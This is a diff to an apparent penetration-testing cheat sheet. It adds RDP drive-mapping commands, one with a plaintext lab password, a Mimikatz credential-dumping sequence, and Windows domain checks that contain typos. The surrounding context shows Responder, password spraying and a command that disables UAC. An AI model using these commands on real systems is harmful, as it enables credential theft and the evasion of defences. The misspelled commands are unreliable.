@@ -450,7 +450,7 @@ rcp | rexec | rlogin | rsh | rstat | rwho | rusers -al
 # RDP -p3389/TCP
 nmap -sV -sC <IP> -p3389 --script rdp*
 ./rdp-sec-check.pl <IP>
-xfreerdp /u:<username> /p:"<password>" /v:<IP>
+xfreerdp /u:<username> /p:"<password>" /v:<IP> /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
 
 # WinRM -p5985/HTTP/TCP,5986/HTTPS/TCP
 For windows --> The Test-WsMan cmdlet is responsible for this
@@ -760,6 +760,7 @@ Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destinati
 ```
 A> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 OR A> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+OR A> xfreerdp3 /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
 V> \\tsclient\
 
 V> After selecting the drive, we can interact with it in the remote session that follows.
@@ -1530,9 +1531,13 @@ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
 ```
 ## Active Directory
-
 #### Initial Enumeration
 ```
+# Dump credentials with Mimikatz:
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
 # Responder 
 sudo responder -I ens224 -A
 
@@ -1622,6 +1627,9 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ```
 ##### [Enumerating Disabling/Bypassing Security Controls](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
+# whoami
+# whomami /groups
+
 # Checking the Status of Defender with Get-MpComputerStatus
 Get-MpComputerStatus
 
@@ -1637,6 +1645,10 @@ Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
 
 # Check for alternative Av products
 Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+# Check if this computer part of the domain
+(Get-CimInstance Win32_ComuterSystem).PartOfDoman
+# Get the domain it self that this pc part of it
+(Get-CimInstance Win32_ComuterSystem).Domain
 
 # Disabling UAC
 cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
